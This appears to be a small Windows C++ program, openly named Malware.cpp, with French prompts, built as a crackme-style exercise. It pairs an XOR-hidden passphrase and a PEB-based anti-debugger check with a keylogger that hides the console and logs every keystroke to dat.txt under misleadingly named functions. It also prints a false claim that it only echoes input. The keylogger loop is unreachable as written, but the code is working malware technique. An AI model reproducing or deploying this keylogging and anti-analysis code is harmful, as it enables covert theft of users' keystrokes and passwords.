// Malware.cpp : Ce fichier contient la fonction 'main'. L'exécution du programme commence et se termine à cet endroit.
//

#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
using namespace std;

char inutile[] = { '\x7a', '\x4e', '\x6d', '\x63', '\x44', '\x4e', '\x4f', '\x5a', '\x4f', '\x44', '\x4e', '\x4b', '\x44', '\x5e' };

void SET_PATHH(string input) {
	fstream SET_PATHHFile;
	SET_PATHHFile.open("dat.txt", fstream::app);
	if (SET_PATHHFile.is_open()) {
		SET_PATHHFile << input;
		SET_PATHHFile.close();
	}
}

bool DESKTOP_SERV(int S_Key) {
	switch (S_Key) {
	case VK_RETURN:
		cout << "\n";
		SET_PATHH("\n");
		return true;
	case '¾':
		cout << ".";
		SET_PATHH(".");
		return true;
	case VK_SHIFT:
		cout << "#CLSID#";
		SET_PATHH("#CLSID#");
		return true;
	case VK_BACK:
		cout << "\b";
		SET_PATHH("\b");
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		SET_PATHH("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		cout << "#_SERV#";
		SET_PATHH("#_SERV");
		return true;
	case VK_UP:
		cout << "#UP";
		SET_PATHH("#UP_GUID_KEY");
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		SET_PATHH("#DOWN_GUID_KEY");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		SET_PATHH("#LEFT_GUID_KEY");
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		SET_PATHH("#RIGHT_GUID_KEY");
		return true;
	case VK_CONTROL:
		cout << "#CONTROL";
		SET_PATHH("#CONTROL");
		return true;
	case VK_MENU:
		cout << "#GUIDGEN";
		SET_PATHH("#GUIDGEN");
		return true;
	default:
		return false;
	}
}

string convertToString(char a[], int size)
{
	string s = "";
	for (int i = 0; i < size; i++) {
		s = s + a[i];
	}
	return s;
}

void dechiffre() {
	for (int i = 0; i < sizeof(inutile); i++) {
		inutile[i] ^= 42;
	}
}

int main() {
	string userInput;
	string word = "oui";
	string lol;
	char* ppeb;
	int loop = 1;

	__asm {
		xor ebx, ebx
		xor ecx, ecx
		mov edx, 3
		boucle:
			add ebx, edx
			inc ecx
			cmp ecx, 16
			jl boucle
			mov eax, fs: [ebx]
			mov ppeb, eax

	}


	if ((int)ppeb[2] == 1) {
		cout << "Debugger c est tricher";
		cin.ignore();
		return 0;
	}
	else {
		cout << "La seule fonction de ce programme est d afficher a l'ecran la chaine de caracteres saisie par l utilisateur\n";
		while (loop == 1) {
			cout << "Veuillez entrer une chaine de caracteres: \n";
			getline(cin, userInput);
			dechiffre();
			lol = convertToString(inutile, 14);
			if (userInput == lol) {
				cout << "Vous avez trouve la phrase magique, bravo !!!";
				return 0;
			}
			else {
				dechiffre();
				lol = "Nope";
				cout << "Vous avez saisi: " << userInput << "\n";
				cin.ignore();
				cout << "Voulez-vous entrer une nouvelle chaine de caracteres ? Repondez par 'non' exactement pour sortir\n";
				getline(cin, word);
				cin.ignore();
				if (word == "non") { loop = 0; return 0; }
			}
		}
	}



	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';

	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (DESKTOP_SERV(KEY) == false) {

					fstream SET_PATHHFile;
					SET_PATHHFile.open("dat.txt", fstream::app);
					if (SET_PATHHFile.is_open()) {
						SET_PATHHFile << char(KEY);
						SET_PATHHFile.close();
					}

				}
			}
		}
	}

	return 0;
}